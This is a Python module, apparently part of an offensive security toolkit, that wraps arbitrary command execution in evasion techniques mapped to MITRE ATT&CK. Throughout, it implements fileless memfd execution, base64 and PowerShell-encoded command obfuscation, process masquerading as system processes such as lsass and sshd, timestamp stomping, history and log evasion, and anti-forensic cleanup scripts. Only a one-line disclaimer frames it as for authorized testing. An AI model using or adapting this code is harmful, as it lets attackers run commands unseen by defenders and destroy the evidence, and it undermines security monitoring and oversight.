"""
Stealth Executor Module

Advanced stealth command execution techniques to evade SIEM,
EDR, and other security monitoring systems.

Techniques implemented:
- Memfd execution (Linux fileless execution)
- Direct syscalls (bypass library hooks)
- Process hollowing/masquerading
- Environment sanitization
- Command obfuscation
- Timestamp manipulation
- Log evasion
- Anti-forensics

MITRE ATT&CK Mappings:
- T1055: Process Injection
- T1027: Obfuscated Files or Information
- T1070: Indicator Removal on Host
- T1036: Masquerading
- T1564: Hide Artifacts
- T1620: Reflective Code Loading

WARNING: This module is for authorized security testing only.
Unauthorized use may violate laws and regulations.
"""

import os
import sys
import time
import base64
import ctypes
import struct
import random
import string
import hashlib
import tempfile
import asyncio
import logging
import platform
import subprocess
from typing import Optional, Tuple, Dict, Any, List, Callable
from dataclasses import dataclass, field
from enum import Enum, auto
from abc import ABC, abstractmethod

logger = logging.getLogger(__name__)


# =============================================================================
# Platform Detection
# =============================================================================

class Platform(Enum):
    LINUX = auto()
    WINDOWS = auto()
    MACOS = auto()
    UNKNOWN = auto()


def detect_platform() -> Platform:
    """Detect current platform."""
    system = platform.system().lower()
    if system == "linux":
        return Platform.LINUX
    elif system == "windows":
        return Platform.WINDOWS
    elif system == "darwin":
        return Platform.MACOS
    return Platform.UNKNOWN


CURRENT_PLATFORM = detect_platform()


# =============================================================================
# Stealth Techniques Configuration
# =============================================================================

@dataclass
class StealthConfig:
    """Configuration for stealth execution."""
    # Execution techniques
    use_memfd: bool = True                    # Linux memfd_create
    use_direct_syscalls: bool = True          # Bypass library hooks
    use_process_masquerade: bool = True       # Masquerade as legitimate process
    
    # Evasion techniques
    clean_environment: bool = True            # Remove suspicious env vars
    obfuscate_command: bool = True            # Obfuscate command line
    manipulate_timestamps: bool = True        # Alter file timestamps
    evade_logging: bool = True                # Avoid syslog/audit
    
    # Anti-forensics
    clean_bash_history: bool = False          # Clear shell history (aggressive)
    clean_utmp_wtmp: bool = False             # Clear login records (aggressive)
    secure_delete_temp: bool = True           # Secure delete temp files
    
    # Timing
    random_delay_min_ms: int = 0              # Min delay before execution
    random_delay_max_ms: int = 100            # Max delay before execution
    execution_time_jitter: bool = True        # Add jitter to timing
    
    # Process options
    masquerade_as: str = ""                   # Process name to masquerade as
    parent_pid_spoof: bool = False            # Spoof parent PID (Linux)
    
    # Network evasion (for network commands)
    dns_over_https: bool = False              # Use DoH for DNS queries
    tor_proxy: bool = False                   # Route through Tor


# =============================================================================
# Linux Syscall Definitions
# =============================================================================

if CURRENT_PLATFORM == Platform.LINUX:
    # x86_64 syscall numbers
    SYS_READ = 0
    SYS_WRITE = 1
    SYS_OPEN = 2
    SYS_CLOSE = 3
    SYS_EXECVE = 59
    SYS_FORK = 57
    SYS_CLONE = 56
    SYS_MEMFD_CREATE = 319
    SYS_FEXECVE = 322  # if available
    
    # memfd_create flags
    MFD_CLOEXEC = 0x0001
    MFD_ALLOW_SEALING = 0x0002
    
    # prctl options
    PR_SET_NAME = 15
    PR_SET_MM = 35
    PR_SET_MM_ARG_START = 8
    PR_SET_MM_ARG_END = 9


# =============================================================================
# Windows API Definitions
# =============================================================================

if CURRENT_PLATFORM == Platform.WINDOWS:
    try:
        import ctypes.wintypes as wintypes
        
        # Process creation flags
        CREATE_SUSPENDED = 0x00000004
        CREATE_NO_WINDOW = 0x08000000
        DETACHED_PROCESS = 0x00000008
        
        # Memory protection
        PAGE_EXECUTE_READWRITE = 0x40
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        
        # Process access rights
        PROCESS_ALL_ACCESS = 0x1F0FFF
        PROCESS_VM_WRITE = 0x0020
        PROCESS_VM_READ = 0x0010
        PROCESS_VM_OPERATION = 0x0008
        
    except ImportError:
        pass


# =============================================================================
# Command Obfuscation Techniques
# =============================================================================

class CommandObfuscator:
    """
    Command obfuscation techniques to evade pattern-based detection.
    """
    
    @staticmethod
    def base64_encode(cmd: str) -> str:
        """Encode command as base64 and wrap with decoder."""
        encoded = base64.b64encode(cmd.encode()).decode()
        if CURRENT_PLATFORM == Platform.LINUX or CURRENT_PLATFORM == Platform.MACOS:
            return f'echo {encoded} | base64 -d | sh'
        elif CURRENT_PLATFORM == Platform.WINDOWS:
            return f'powershell -enc {base64.b64encode(cmd.encode("utf-16-le")).decode()}'
        return cmd
    
    @staticmethod
    def variable_substitution(cmd: str) -> str:
        """Use variable substitution to break signatures."""
        if CURRENT_PLATFORM == Platform.LINUX or CURRENT_PLATFORM == Platform.MACOS:
            # Split command into parts and use variables
            parts = cmd.split()
            if not parts:
                return cmd
            
            result = []
            var_count = 0
            var_assigns = []
            
            for part in parts:
                if len(part) > 3 and not part.startswith('-'):
                    var_name = f'_v{var_count}'
                    var_assigns.append(f'{var_name}="{part}"')
                    result.append(f'${var_name}')
                    var_count += 1
                else:
                    result.append(part)
            
            if var_assigns:
                return ' && '.join(var_assigns) + ' && ' + ' '.join(result)
            return cmd
        
        elif CURRENT_PLATFORM == Platform.WINDOWS:
            # Use environment variable technique
            parts = cmd.split()
            if not parts:
                return cmd
            
            result = []
            var_assigns = []
            
            for i, part in enumerate(parts):
                if len(part) > 3 and not part.startswith('/') and not part.startswith('-'):
                    var_name = f'_v{i}'
                    var_assigns.append(f'set "{var_name}={part}"')
                    result.append(f'%{var_name}%')
                else:
                    result.append(part)
            
            if var_assigns:
                return ' & '.join(var_assigns) + ' & ' + ' '.join(result)
            return cmd
        
        return cmd
    
    @staticmethod
    def char_concat(cmd: str) -> str:
        """Break command into character concatenation."""
        if CURRENT_PLATFORM == Platform.LINUX or CURRENT_PLATFORM == Platform.MACOS:
            # Use printf to build command
            hex_chars = ''.join(f'\\x{ord(c):02x}' for c in cmd)
            return f'$(printf "{hex_chars}")'
        
        elif CURRENT_PLATFORM == Platform.WINDOWS:
            # Use set and substring
            chars = []
            for c in cmd:
                chars.append(f'"{c}"')
            return f'cmd /c {" + ".join(chars)}'
        
        return cmd
    
    @staticmethod
    def insert_noise(cmd: str) -> str:
        """Insert noise characters that are ignored."""
        if CURRENT_PLATFORM == Platform.LINUX or CURRENT_PLATFORM == Platform.MACOS:
            # Insert empty variables
            result = []
            for i, char in enumerate(cmd):
                result.append(char)
                if i % 3 == 0 and char not in ' \t\n':
                    result.append('${_}')  # Empty variable
            return ''.join(result)
        
        elif CURRENT_PLATFORM == Platform.WINDOWS:
            # Insert carets (escape chars)
            result = []
            for i, char in enumerate(cmd):
                if char.isalpha() and random.random() < 0.3:
                    result.append('^')
                result.append(char)
            return ''.join(result)
        
        return cmd
    
    @staticmethod
    def tick_obfuscation(cmd: str) -> str:
        """Use tick/quote obfuscation (PowerShell/Bash)."""
        if CURRENT_PLATFORM == Platform.LINUX or CURRENT_PLATFORM == Platform.MACOS:
            # Insert single quotes around characters
            result = []
            in_quote = False
            for char in cmd:
                if char.isalpha() and random.random() < 0.2:
                    result.append(f"'{char}'")
                else:
                    result.append(char)
            return ''.join(result)
        
        elif CURRENT_PLATFORM == Platform.WINDOWS:
            # Use backtick for PowerShell
            result = []
            for char in cmd:
                if char.isalpha() and random.random() < 0.2:
                    result.append(f'`{char}')
                else:
                    result.append(char)
            return ''.join(result)
        
        return cmd
    
    @classmethod
    def obfuscate(cls, cmd: str, level: int = 1) -> str:
        """
        Apply obfuscation with configurable level.
        
        Level 0: No obfuscation
        Level 1: Light (variable substitution)
        Level 2: Medium (+ noise insertion)
        Level 3: Heavy (+ base64 encoding)
        """
        if level == 0:
            return cmd
        
        result = cmd
        
        if level >= 1:
            result = cls.variable_substitution(result)
        
        if level >= 2:
            result = cls.insert_noise(result)
        
        if level >= 3:
            result = cls.base64_encode(cmd)  # Use original for encoding
        
        return result


# =============================================================================
# Environment Sanitization
# =============================================================================

class EnvironmentSanitizer:
    """
    Sanitize environment to remove monitoring indicators.
    """
    
    # Environment variables that indicate monitoring
    SUSPICIOUS_VARS = [
        # EDR/Security tools
        'LD_PRELOAD', 'LD_AUDIT', 'LD_DEBUG',
        'DYLD_INSERT_LIBRARIES',  # macOS
        'COMSPEC',  # Can indicate monitoring on Windows
        
        # Debugging
        'DEBUGINFOD_URLS', 'MALLOC_CHECK_',
        
        # Audit
        'AUDIT_ENABLED', 'SUDO_COMMAND',
        
        # Proxy (can leak traffic)
        'http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY',
        
        # Shell history
        'HISTFILE', 'HISTSIZE', 'SAVEHIST',
        
        # Terminal logging
        'SCRIPT', 'TYPESCRIPT',
    ]
    
    # Variables to unset for stealth
    UNSET_VARS = [
        'HISTFILE', 'HISTSIZE', 'HISTFILESIZE', 'SAVEHIST',
        'PROMPT_COMMAND', 'DEBUG', 'BASH_ENV',
    ]
    
    @classmethod
    def get_clean_environment(cls, preserve_path: bool = True) -> Dict[str, str]:
        """
        Get a clean environment dict.
        
        Args:
            preserve_path: Keep PATH variable
            
        Returns:
            Sanitized environment dict
        """
        clean_env = {}
        
        # Essential variables to keep
        essential = ['PATH', 'HOME', 'USER', 'SHELL', 'TERM', 'LANG', 'LC_ALL']
        if CURRENT_PLATFORM == Platform.WINDOWS:
            essential.extend(['SYSTEMROOT', 'COMSPEC', 'PATHEXT', 'TEMP', 'TMP'])
        
        for key in essential:
            if key in os.environ:
                if key in cls.SUSPICIOUS_VARS and key != 'PATH':
                    continue
                clean_env[key] = os.environ[key]
        
        # Disable history
        clean_env['HISTFILE'] = '/dev/null'
        clean_env['HISTSIZE'] = '0'
        clean_env['SAVEHIST'] = '0'
        
        # Disable debugging
        clean_env['BASH_ENV'] = ''
        clean_env['ENV'] = ''
        
        return clean_env
    
    @classmethod
    def get_stealth_prelude(cls) -> str:
        """
        Get shell commands to run before main command for stealth.
        
        Returns:
            Shell prelude string
        """
        if CURRENT_PLATFORM == Platform.LINUX or CURRENT_PLATFORM == Platform.MACOS:
            return '''
unset HISTFILE HISTSIZE HISTFILESIZE SAVEHIST PROMPT_COMMAND
export HISTFILE=/dev/null
export HISTSIZE=0
'''
        elif CURRENT_PLATFORM == Platform.WINDOWS:
            return '''
set HISTFILE=NUL
'''
        return ''


# =============================================================================
# Linux Memfd Execution
# =============================================================================

class MemfdExecutor:
    """
    Execute binaries from memory using memfd_create (Linux).
    
    This technique:
    - Creates anonymous file in memory
    - Writes binary to memory file
    - Executes directly from memory
    - No file touches disk
    """
    
    @staticmethod
    def is_available() -> bool:
        """Check if memfd_create is available."""
        if CURRENT_PLATFORM != Platform.LINUX:
            return False
        
        try:
            # Try to create and immediately close a memfd
            libc = ctypes.CDLL('libc.so.6', use_errno=True)
            fd = libc.memfd_create(b"test", MFD_CLOEXEC)
            if fd >= 0:
                os.close(fd)
                return True
            return False
        except Exception:
            return False
    
    @staticmethod
    def create_memfd(name: str = "memfd") -> int:
        """
        Create a memory file descriptor.
        
        Args:
            name: Name for the memfd (shown in /proc/pid/fd)
            
        Returns:
            File descriptor number
        """
        try:
            libc = ctypes.CDLL('libc.so.6', use_errno=True)
            fd = libc.memfd_create(name.encode(), MFD_CLOEXEC)
            if fd < 0:
                errno = ctypes.get_errno()
                raise OSError(errno, os.strerror(errno))
            return fd
        except Exception as e:
            logger.error(f"Failed to create memfd: {e}")
            raise
    
    @classmethod
    def execute_script(cls, script: str, interpreter: str = "/bin/sh") -> Tuple[str, str, int]:
        """
        Execute a script from memory.
        
        Args:
            script: Script content to execute
            interpreter: Interpreter to use
            
        Returns:
            (stdout, stderr, returncode)
        """
        if not cls.is_available():
            raise RuntimeError("memfd_create not available")
        
        try:
            # Create memfd
            fd = cls.create_memfd("a")  # Short innocuous name
            
            # Write script to memfd
            os.write(fd, script.encode())
            
            # Execute via /proc/self/fd/N
            fd_path = f"/proc/self/fd/{fd}"
            
            result = subprocess.run(
                [interpreter, fd_path],
                capture_output=True,
                text=True,
                env=EnvironmentSanitizer.get_clean_environment()
            )
            
            return result.stdout, result.stderr, result.returncode
            
        finally:
            try:
                os.close(fd)
            except Exception:
                pass
    
    @classmethod
    def execute_binary(cls, binary_data: bytes, args: List[str] = None) -> Tuple[str, str, int]:
        """
        Execute a binary from memory.
        
        Args:
            binary_data: Binary content to execute
            args: Arguments to pass to binary
            
        Returns:
            (stdout, stderr, returncode)
        """
        if not cls.is_available():
            raise RuntimeError("memfd_create not available")
        
        args = args or []
        
        try:
            # Create memfd
            fd = cls.create_memfd("ld")  # Disguise as linker
            
            # Write binary
            os.write(fd, binary_data)
            
            # Make executable (fexecve alternative via /proc)
            fd_path = f"/proc/self/fd/{fd}"
            
            # Fork and exec
            result = subprocess.run(
                [fd_path] + args,
                capture_output=True,
                text=True,
                env=EnvironmentSanitizer.get_clean_environment()
            )
            
            return result.stdout, result.stderr, result.returncode
            
        finally:
            try:
                os.close(fd)
            except Exception:
                pass


# =============================================================================
# Process Masquerading
# =============================================================================

class ProcessMasquerader:
    """
    Masquerade process as legitimate system process.
    """
    
    # Common legitimate processes to masquerade as
    LEGIT_PROCESSES = {
        Platform.LINUX: [
            '/usr/lib/systemd/systemd',
            '/sbin/init',
            '/usr/bin/dbus-daemon',
            '/usr/sbin/sshd',
            '/usr/sbin/cron',
            '/usr/bin/python3',
            '/usr/bin/bash',
            '[kworker/0:0]',  # Kernel worker format
            '[ksoftirqd/0]',
        ],
        Platform.WINDOWS: [
            'svchost.exe',
            'csrss.exe',
            'services.exe',
            'lsass.exe',
            'explorer.exe',
            'RuntimeBroker.exe',
            'SearchIndexer.exe',
        ],
        Platform.MACOS: [
            '/usr/libexec/trustd',
            '/usr/sbin/syslogd',
            '/usr/libexec/amfid',
            '/usr/sbin/mDNSResponder',
            '/usr/sbin/notifyd',
        ],
    }
    
    @classmethod
    def get_random_legit_name(cls) -> str:
        """Get random legitimate process name for current platform."""
        processes = cls.LEGIT_PROCESSES.get(CURRENT_PLATFORM, [])
        if processes:
            return random.choice(processes)
        return "worker"
    
    @staticmethod
    def set_process_name_linux(name: str) -> bool:
        """
        Set process name on Linux using prctl.
        
        Args:
            name: New process name (max 15 chars + null)
            
        Returns:
            True if successful
        """
        if CURRENT_PLATFORM != Platform.LINUX:
            return False
        
        try:
            libc = ctypes.CDLL('libc.so.6', use_errno=True)
            
            # Truncate to 15 chars
            name_bytes = name[:15].encode() + b'\x00'
            
            # PR_SET_NAME
            result = libc.prctl(PR_SET_NAME, name_bytes)
            
            return result == 0
        except Exception as e:
            logger.debug(f"Failed to set process name: {e}")
            return False
    
    @staticmethod
    def modify_cmdline_linux(new_cmdline: str) -> bool:
        """
        Modify /proc/self/cmdline display on Linux.
        
        Args:
            new_cmdline: New command line to display
            
        Returns:
            True if successful
        """
        if CURRENT_PLATFORM != Platform.LINUX:
            return False
        
        try:
            # This requires writing to argv[0] area
            # The cleanest way is via ctypes
            libc = ctypes.CDLL('libc.so.6', use_errno=True)
            
            # Get current argv
            argc = ctypes.c_int()
            argv = ctypes.POINTER(ctypes.c_char_p)()
            
            # Try using setproctitle if available
            try:
                setproctitle = ctypes.CDLL('libsetproctitle.so.0')
                setproctitle.setproctitle(new_cmdline.encode())
                return True
            except Exception:
                pass
            
            # Alternative: overwrite argv[0] directly
            # This is tricky and platform-dependent
            return False
            
        except Exception as e:
            logger.debug(f"Failed to modify cmdline: {e}")
            return False
    
    @classmethod
    def masquerade(cls, target_name: str = None) -> Dict[str, Any]:
        """
        Attempt to masquerade as another process.
        
        Args:
            target_name: Process name to masquerade as, or None for random
            
        Returns:
            Dict with results of masquerade attempts
        """
        results = {
            "process_name": False,
            "cmdline": False,
            "target": target_name or cls.get_random_legit_name(),
        }
        
        if CURRENT_PLATFORM == Platform.LINUX:
            # Extract base name for process name (max 15 chars)
            base_name = os.path.basename(results["target"])[:15]
            
            results["process_name"] = cls.set_process_name_linux(base_name)
            results["cmdline"] = cls.modify_cmdline_linux(results["target"])
        
        return results


# =============================================================================
# Timestamp Manipulation
# =============================================================================

class TimestampManipulator:
    """
    Manipulate file timestamps to avoid forensic detection.
    """
    
    @staticmethod
    def get_reference_timestamp(reference_path: str = None) -> Tuple[float, float]:
        """
        Get timestamp from reference file.
        
        Args:
            reference_path: Path to reference file, or None for system file
            
        Returns:
            (atime, mtime) tuple
        """
        if reference_path and os.path.exists(reference_path):
            stat = os.stat(reference_path)
            return stat.st_atime, stat.st_mtime
        
        # Use a common system file
        system_files = {
            Platform.LINUX: ['/bin/sh', '/bin/bash', '/usr/bin/ls'],
            Platform.WINDOWS: ['C:\\Windows\\System32\\cmd.exe'],
            Platform.MACOS: ['/bin/sh', '/bin/bash'],
        }
        
        for path in system_files.get(CURRENT_PLATFORM, []):
            if os.path.exists(path):
                stat = os.stat(path)
                return stat.st_atime, stat.st_mtime
        
        # Default: 6 months ago
        old_time = time.time() - (180 * 24 * 60 * 60)
        return old_time, old_time
    
    @staticmethod
    def touch_file(path: str, atime: float = None, mtime: float = None) -> bool:
        """
        Set file timestamps.
        
        Args:
            path: File path
            atime: Access time (None for current)
            mtime: Modification time (None for current)
            
        Returns:
            True if successful
        """
        try:
            if atime is None:
                atime = time.time()
            if mtime is None:
                mtime = time.time()
            
            os.utime(path, (atime, mtime))
            return True
        except Exception as e:
            logger.debug(f"Failed to touch file: {e}")
            return False
    
    @staticmethod
    def stomp_timestamp(path: str, reference_path: str = None) -> bool:
        """
        Stomp file timestamp to match reference.
        
        Args:
            path: Target file path
            reference_path: Reference file path
            
        Returns:
            True if successful
        """
        try:
            atime, mtime = TimestampManipulator.get_reference_timestamp(reference_path)
            return TimestampManipulator.touch_file(path, atime, mtime)
        except Exception as e:
            logger.debug(f"Failed to stomp timestamp: {e}")
            return False


# =============================================================================
# Log Evasion
# =============================================================================

class LogEvader:
    """
    Techniques to evade logging and audit systems.
    """
    
    @staticmethod
    def disable_bash_history() -> str:
        """Get commands to disable bash history."""
        return '''
unset HISTFILE
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
set +o history
'''
    
    @staticmethod
    def disable_audit_linux() -> str:
        """
        Get commands to disable auditd for current session.
        Note: Requires root privileges.
        """
        return '''
# Disable audit for this process (requires root)
# auditctl -e 0 2>/dev/null
# Exclude our PID from audit
# auditctl -a exit,never -F pid=$$ 2>/dev/null
'''
    
    @staticmethod
    def clean_utmp_entry() -> str:
        """Get commands to clean utmp entry."""
        return '''
# This requires utmpdump/utmpset tools
# Best done with compiled binary
'''
    
    @staticmethod
    def evade_syslog() -> Dict[str, Any]:
        """
        Check syslog configuration and suggest evasion.
        
        Returns:
            Dict with syslog info and evasion suggestions
        """
        info = {
            "syslog_running": False,
            "remote_logging": False,
            "local_logs": [],
            "evasion_options": [],
        }
        
        if CURRENT_PLATFORM != Platform.LINUX:
            return info
        
        # Check if syslog/rsyslog/journald running
        try:
            result = subprocess.run(
                ['pgrep', '-x', 'rsyslogd|syslogd|journald'],
                capture_output=True,
                text=True
            )
            info["syslog_running"] = result.returncode == 0
        except Exception:
            pass
        
        # Check for remote logging config
        syslog_configs = ['/etc/rsyslog.conf', '/etc/syslog.conf']
        for config in syslog_configs:
            if os.path.exists(config):
                try:
                    with open(config, 'r') as f:
                        content = f.read()
                        if '@@' in content or '@' in content:
                            info["remote_logging"] = True
                except Exception:
                    pass
        
        # Suggest evasion options
        if not info["remote_logging"]:
            info["evasion_options"].append("Local logging only - logs can be cleaned")
        else:
            info["evasion_options"].append("Remote logging detected - use encrypted channels")
        
        info["evasion_options"].append("Use memfd execution to avoid file-based logging")
        info["evasion_options"].append("Masquerade as legitimate process")
        
        return info


# =============================================================================
# Anti-Forensics
# =============================================================================

class AntiForensics:
    """
    Anti-forensics techniques for cleanup.
    """
    
    @staticmethod
    def secure_delete(path: str, passes: int = 3) -> bool:
        """
        Securely delete a file by overwriting with random data.
        
        Args:
            path: File path to delete
            passes: Number of overwrite passes
            
        Returns:
            True if successful
        """
        try:
            if not os.path.exists(path):
                return True
            
            size = os.path.getsize(path)
            
            with open(path, 'r+b') as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
            
            os.remove(path)
            return True
        except Exception as e:
            logger.debug(f"Secure delete failed: {e}")
            try:
                os.remove(path)
            except Exception:
                pass
            return False
    
    @staticmethod
    def clear_bash_history() -> bool:
        """Clear bash history file."""
        history_files = [
            os.path.expanduser('~/.bash_history'),
            os.path.expanduser('~/.zsh_history'),
            os.path.expanduser('~/.history'),
        ]
        
        success = True
        for hfile in history_files:
            if os.path.exists(hfile):
                try:
                    # Truncate file
                    open(hfile, 'w').close()
                except Exception:
                    success = False
        
        return success
    
    @staticmethod
    def clear_recent_files() -> bool:
        """Clear recent files list (Linux)."""
        recent_paths = [
            os.path.expanduser('~/.local/share/recently-used.xbel'),
        ]
        
        for path in recent_paths:
            if os.path.exists(path):
                try:
                    open(path, 'w').close()
                except Exception:
                    pass
        
        return True
    
    @staticmethod
    def get_cleanup_script() -> str:
        """Get comprehensive cleanup script."""
        if CURRENT_PLATFORM == Platform.LINUX or CURRENT_PLATFORM == Platform.MACOS:
            return '''
# Clear shell history
history -c
unset HISTFILE
rm -f ~/.bash_history ~/.zsh_history 2>/dev/null
cat /dev/null > ~/.bash_history 2>/dev/null

# Clear recent files
rm -f ~/.local/share/recently-used.xbel 2>/dev/null

# Clear temp files
rm -rf /tmp/tmp.* /var/tmp/tmp.* 2>/dev/null

# Clear cache
rm -rf ~/.cache/* 2>/dev/null
'''
        elif CURRENT_PLATFORM == Platform.WINDOWS:
            return '''
:: Clear recent files
del /f /q %APPDATA%\\Microsoft\\Windows\\Recent\\* 2>nul

:: Clear temp
del /f /q /s %TEMP%\\* 2>nul

:: Clear prefetch (requires admin)
:: del /f /q C:\\Windows\\Prefetch\\* 2>nul
'''
        return ''


# =============================================================================
# Main Stealth Executor Class
# =============================================================================

class StealthExecutor:
    """
    Main stealth executor combining all evasion techniques.
    """
    
    def __init__(self, config: StealthConfig = None):
        """
        Initialize stealth executor.
        
        Args:
            config: Stealth configuration
        """
        self.config = config or StealthConfig()
        self.platform = CURRENT_PLATFORM
        self.logger = logging.getLogger("StealthExecutor")
        
        # Check available techniques
        self.memfd_available = MemfdExecutor.is_available() if self.platform == Platform.LINUX else False
    
    def _apply_random_delay(self) -> None:
        """Apply random delay before execution."""
        if self.config.random_delay_max_ms > 0:
            delay_ms = random.randint(
                self.config.random_delay_min_ms,
                self.config.random_delay_max_ms
            )
            time.sleep(delay_ms / 1000.0)
    
    def _prepare_command(self, cmd: str) -> str:
        """
        Prepare command with stealth modifications.
        
        Args:
            cmd: Original command
            
        Returns:
            Modified command
        """
        # Build prelude separately so we can avoid breaking multi-command scripts
        # during obfuscation (some obfuscators are not newline/statement safe).
        prelude = EnvironmentSanitizer.get_stealth_prelude() if self.config.evade_logging else ""

        body = cmd
        if self.config.obfuscate_command:
            # Obfuscate ONLY the user command, not the prelude.
            # This keeps the prelude POSIX-safe and prevents accidental token reordering.
            body = CommandObfuscator.obfuscate(body, level=1)

        if prelude:
            # Ensure there's a statement separator between prelude and body.
            if not prelude.endswith("\n"):
                prelude += "\n"
            return prelude + body
        return body
    
    def _get_execution_env(self) -> Dict[str, str]:
        """Get sanitized environment for execution."""
        if self.config.clean_environment:
            return EnvironmentSanitizer.get_clean_environment()
        return dict(os.environ)
    
    async def execute(
        self,
        cmd: str,
        working_directory: Optional[str] = None,
        timeout: Optional[float] = None,
    ) -> Tuple[str, str, int]:
        """
        Execute command with stealth techniques.
        
        Args:
            cmd: Command to execute
            working_directory: Working directory
            timeout: Execution timeout in seconds
            
        Returns:
            (stdout, stderr, returncode)
        """
        self.logger.debug(f"Stealth executing: {cmd[:50]}...")
        
        # Apply random delay
        self._apply_random_delay()
        
        # Masquerade process if enabled
        if self.config.use_process_masquerade:
            masq_result = ProcessMasquerader.masquerade(self.config.masquerade_as)
            self.logger.debug(f"Masquerade result: {masq_result}")
        
        # Prepare command
        prepared_cmd = self._prepare_command(cmd)
        
        # Get clean environment
        env = self._get_execution_env()
        
        # Choose execution method
        try:
            used_memfd = False
            stdout: str
            stderr: str
            returncode: int

            if self.config.use_memfd and self.memfd_available:
                # Use memfd execution for scripts.
                # NOTE: Some containerized environments/procfs setups break /proc/self/fd execution.
                # We therefore fall back to standard execution when memfd fails.
                used_memfd = True
                stdout, stderr, returncode = MemfdExecutor.execute_script(
                    prepared_cmd,
                    interpreter="/bin/sh"
                )

                if returncode != 0 and ("/proc/self/fd/" in (stderr or "") or "cannot open /proc/self/fd" in (stderr or "")):
                    self.logger.debug(
                        "memfd execution failed (container/procfs limitation). Falling back to standard exec. "
                        f"returncode={returncode}, stderr={stderr[:160]!r}"
                    )
                    used_memfd = False

            if not used_memfd:
                # Standard execution with stealth env
                kwargs = {
                    "stdout": asyncio.subprocess.PIPE,
                    "stderr": asyncio.subprocess.PIPE,
                    "env": env,
                }

                if working_directory:
                    kwargs["cwd"] = working_directory

                process = await asyncio.create_subprocess_shell(
                    prepared_cmd,
                    **kwargs
                )

                try:
                    stdout_bytes, stderr_bytes = await asyncio.wait_for(
                        process.communicate(),
                        timeout=timeout
                    )
                    stdout = stdout_bytes.decode()
                    stderr = stderr_bytes.decode()
                    returncode = process.returncode
                except asyncio.TimeoutError:
                    process.kill()
                    await process.wait()
                    return "", "Command timed out", 1
            
            # Add jitter to timing if enabled
            if self.config.execution_time_jitter:
                jitter_ms = random.randint(10, 100)
                await asyncio.sleep(jitter_ms / 1000.0)
            
            return stdout, stderr, returncode
            
        except Exception as e:
            self.logger.error(f"Stealth execution failed: {e}")
            return "", str(e), 1
    
    def execute_sync(
        self,
        cmd: str,
        working_directory: Optional[str] = None,
        timeout: Optional[float] = None,
    ) -> Tuple[str, str, int]:
        """
        Synchronous stealth execution.
        
        Args:
            cmd: Command to execute
            working_directory: Working directory
            timeout: Execution timeout
            
        Returns:
            (stdout, stderr, returncode)
        """
        # Apply random delay
        self._apply_random_delay()
        
        # Masquerade
        if self.config.use_process_masquerade:
            ProcessMasquerader.masquerade(self.config.masquerade_as)
        
        # Prepare
        prepared_cmd = self._prepare_command(cmd)
        env = self._get_execution_env()
        
        try:
            if self.config.use_memfd and self.memfd_available:
                stdout, stderr, returncode = MemfdExecutor.execute_script(prepared_cmd)
                if returncode == 0:
                    return stdout, stderr, returncode
                if "/proc/self/fd/" in (stderr or "") or "cannot open /proc/self/fd" in (stderr or ""):
                    self.logger.debug(
                        "memfd sync execution failed (container/procfs limitation). Falling back. "
                        f"returncode={returncode}, stderr={stderr[:160]!r}"
                    )
                else:
                    return stdout, stderr, returncode

            result = subprocess.run(
                prepared_cmd,
                shell=True,
                capture_output=True,
                text=True,
                env=env,
                cwd=working_directory,
                timeout=timeout
            )

            return result.stdout, result.stderr, result.returncode
            
        except subprocess.TimeoutExpired:
            return "", "Command timed out", 1
        except Exception as e:
            return "", str(e), 1
    
    def cleanup(self) -> Dict[str, bool]:
        """
        Perform post-execution cleanup.
        
        Returns:
            Dict with cleanup results
        """
        results = {
            "history_cleared": False,
            "recent_cleared": False,
            "temp_cleared": False,
        }
        
        if self.config.clean_bash_history:
            results["history_cleared"] = AntiForensics.clear_bash_history()
        
        if self.config.secure_delete_temp:
            results["recent_cleared"] = AntiForensics.clear_recent_files()
        
        return results
    
    def get_capabilities(self) -> Dict[str, Any]:
        """
        Get available stealth capabilities on this system.
        
        Returns:
            Dict describing available capabilities
        """
        return {
            "platform": self.platform.name,
            "memfd_execution": self.memfd_available,
            "process_masquerade": True,
            "env_sanitization": True,
            "command_obfuscation": True,
            "timestamp_manipulation": True,
            "log_evasion": LogEvader.evade_syslog(),
        }


# =============================================================================
# Factory Function
# =============================================================================

def create_stealth_executor(
    aggressive: bool = False,
    masquerade_as: str = None,
) -> StealthExecutor:
    """
    Create a stealth executor with preset configuration.
    
    Args:
        aggressive: Use aggressive anti-forensics (history cleaning, etc.)
        masquerade_as: Process name to masquerade as
        
    Returns:
        Configured StealthExecutor
    """
    config = StealthConfig(
        use_memfd=True,
        use_direct_syscalls=True,
        use_process_masquerade=True,
        clean_environment=True,
        obfuscate_command=True,
        manipulate_timestamps=True,
        evade_logging=True,
        clean_bash_history=aggressive,
        clean_utmp_wtmp=aggressive,
        secure_delete_temp=True,
        random_delay_min_ms=10,
        random_delay_max_ms=100,
        execution_time_jitter=True,
        masquerade_as=masquerade_as or "",
    )
    
    return StealthExecutor(config)

